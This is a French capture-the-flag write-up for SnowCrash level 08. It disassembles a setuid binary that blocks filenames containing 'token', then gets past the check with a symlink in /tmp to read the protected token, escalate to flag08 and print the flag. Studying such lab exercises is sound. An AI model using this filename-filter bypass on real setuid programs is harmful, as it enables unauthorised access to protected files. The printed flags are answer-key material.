# LEVEL 08

### Reconnaissance

Une fois connecté, on trouve un binaire et un fichier token
```
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
On l'analyse le binaire avec r2:

```
[0x080484a0]> pdf@main
            ; DATA XREF from entry0 @ 0x80484b7
┌ 336: int main (uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h);
│           ; arg uint32_t arg_8h @ ebp+0x8
│           ; arg int32_t arg_ch @ ebp+0xc
│           ; arg int32_t arg_10h @ ebp+0x10
│           ; var char *oflag @ esp+0x4
│           ; var size_t nbytes @ esp+0x8
│           ; var int32_t var_41ch @ esp+0x18
│           ; var char **path @ esp+0x1c
│           ; var uint32_t fildes @ esp+0x24
│           ; var ssize_t var_40ch @ esp+0x28
│           ; var int32_t var_408h @ esp+0x2c
│           ; var int32_t canary @ esp+0x42c
│           0x08048554      55             push ebp                    ; .//level08.c:8
│           0x08048555      89e5           mov ebp, esp
│           0x08048557      83e4f0         and esp, 0xfffffff0
│           0x0804855a      81ec30040000   sub esp, 0x430
│           0x08048560      8b450c         mov eax, dword [arg_ch]
│           0x08048563      8944241c       mov dword [path], eax
│           0x08048567      8b4510         mov eax, dword [arg_10h]
│           0x0804856a      89442418       mov dword [var_41ch], eax
│           0x0804856e      65a114000000   mov eax, dword gs:[0x14]
│           0x08048574      8984242c0400.  mov dword [canary], eax
│           0x0804857b      31c0           xor eax, eax
│           0x0804857d      837d0801       cmp dword [arg_8h], 1       ; .//level08.c:13
│       ┌─< 0x08048581      7523           jne 0x80485a6
│       │   0x08048583      8b44241c       mov eax, dword [path]       ; .//level08.c:14
│       │   0x08048587      8b10           mov edx, dword [eax]
│       │   0x08048589      b880870408     mov eax, str.s__file_to_read ; 0x8048780 ; "%s [file to read]\n"
│       │   0x0804858e      89542404       mov dword [oflag], edx
│       │   0x08048592      890424         mov dword [esp], eax        ; const char *format
│       │   0x08048595      e886feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0804859a      c70424010000.  mov dword [esp], 1          ; .//level08.c:15 ; int status
│       │   0x080485a1      e8bafeffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x8048581
│       └─> 0x080485a6      8b44241c       mov eax, dword [path]       ; .//level08.c:18
│           0x080485aa      83c004         add eax, 4
│           0x080485ad      8b00           mov eax, dword [eax]
│           0x080485af      c74424049387.  mov dword [oflag], str.token ; [0x8048793:4]=0x656b6f74 ; "token" ; const char *s2
│           0x080485b7      890424         mov dword [esp], eax        ; const char *s1
│           0x080485ba      e841feffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)
│           0x080485bf      85c0           test eax, eax
│       ┌─< 0x080485c1      7426           je 0x80485e9
│       │   0x080485c3      8b44241c       mov eax, dword [path]       ; .//level08.c:19
│       │   0x080485c7      83c004         add eax, 4
│       │   0x080485ca      8b10           mov edx, dword [eax]
│       │   0x080485cc      b899870408     mov eax, str.You_may_not_access___s ; 0x8048799 ; "You may not access '%s'\n"
│       │   0x080485d1      89542404       mov dword [oflag], edx
│       │   0x080485d5      890424         mov dword [esp], eax        ; const char *format
│       │   0x080485d8      e843feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x080485dd      c70424010000.  mov dword [esp], 1          ; .//level08.c:20 ; int status
│       │   0x080485e4      e877feffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x80485c1
│       └─> 0x080485e9      8b44241c       mov eax, dword [path]       ; .//level08.c:24
│           0x080485ed      83c004         add eax, 4
│           0x080485f0      8b00           mov eax, dword [eax]
│           0x080485f2      c74424040000.  mov dword [oflag], 0        ; int oflag
│           0x080485fa      890424         mov dword [esp], eax        ; const char *path
│           0x080485fd      e86efeffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x08048602      89442424       mov dword [fildes], eax
│           0x08048606      837c2424ff     cmp dword [fildes], -1      ; .//level08.c:25
│       ┌─< 0x0804860b      7521           jne 0x804862e
│       │   0x0804860d      8b44241c       mov eax, dword [path]       ; .//level08.c:26
│       │   0x08048611      83c004         add eax, 4
│       │   0x08048614      8b00           mov eax, dword [eax]
│       │   0x08048616      89442408       mov dword [nbytes], eax
│       │   0x0804861a      c7442404b287.  mov dword [oflag], str.Unable_to_open__s ; [0x80487b2:4]=0x62616e55 ; "Unable to open %s"
│       │   0x08048622      c70424010000.  mov dword [esp], 1
│       │   0x08048629      e812feffff     call sym.imp.err
│       │   ; CODE XREF from main @ 0x804860b
│       └─> 0x0804862e      c74424080004.  mov dword [nbytes], 0x400   ; .//level08.c:29 ; [0x400:4]=-1 ; 1024 ; size_t nbyte
│           0x08048636      8d44242c       lea eax, dword [var_408h]
│           0x0804863a      89442404       mov dword [oflag], eax      ; void *buf
│           0x0804863e      8b442424       mov eax, dword [fildes]
│           0x08048642      890424         mov dword [esp], eax        ; int fildes
│           0x08048645      e8c6fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0804864a      89442428       mov dword [var_40ch], eax
│           0x0804864e      837c2428ff     cmp dword [var_40ch], -1    ; .//level08.c:32
│       ┌─< 0x08048653      751c           jne 0x8048671
│       │   0x08048655      8b442424       mov eax, dword [fildes]     ; .//level08.c:33
│       │   0x08048659      89442408       mov dword [nbytes], eax
│       │   0x0804865d      c7442404c487.  mov dword [oflag], str.Unable_to_read_fd__d ; [0x80487c4:4]=0x62616e55 ; "Unable to read fd %d"
│       │   0x08048665      c70424010000.  mov dword [esp], 1
│       │   0x0804866c      e8cffdffff     call sym.imp.err
│       │   ; CODE XREF from main @ 0x8048653
│       └─> 0x08048671      8b442428       mov eax, dword [var_40ch]   ; .//level08.c:36
│           0x08048675      89442408       mov dword [nbytes], eax     ; size_t nbytes
│           0x08048679      8d44242c       lea eax, dword [var_408h]
│           0x0804867d      89442404       mov dword [oflag], eax      ; const char *ptr
│           0x08048681      c70424010000.  mov dword [esp], 1          ; int fd
│           0x08048688      e803feffff     call sym.imp.write          ; ssize_t write(int fd, const char *ptr, size_t nbytes)
│           0x0804868d      8b94242c0400.  mov edx, dword [canary]     ; .//level08.c:37
│           0x08048694      653315140000.  xor edx, dword gs:[0x14]
│       ┌─< 0x0804869b      7405           je 0x80486a2
│       │   0x0804869d      e88efdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x804869b
│       └─> 0x080486a2      c9             leave
└           0x080486a3      c3             ret
```
### Exploitation

On va creer un lien symbolique entre token et notre fichier

```
level08@SnowCrash:~$ ln -s ./token /tmp/test
level08@SnowCrash:~$ file /tmp/test
/tmp/test: broken symbolic link to `./token'
level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/test1
level08@SnowCrash:~$ file /tmp/test1
/tmp/test1: symbolic link to `/home/user/level08/token'
level08@SnowCrash:~$ ./level08 /tmp/test1
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag 
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
